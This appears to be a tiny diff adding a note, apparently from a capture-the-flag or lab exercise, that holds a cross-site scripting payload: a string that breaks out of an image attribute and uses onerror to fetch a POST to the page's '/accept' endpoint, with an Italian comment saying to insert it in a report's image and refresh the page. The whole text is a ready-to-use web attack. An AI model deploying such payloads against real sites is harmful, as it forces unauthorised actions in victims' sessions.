@@ -1,0 +1,3 @@
+" onerror="fetch(window.location.href + '/accept', { method: 'POST'})
+
+Questo è il paylaod da inserire nell'immagine della segnalazione, poi basta fare il refresh della pagina :)
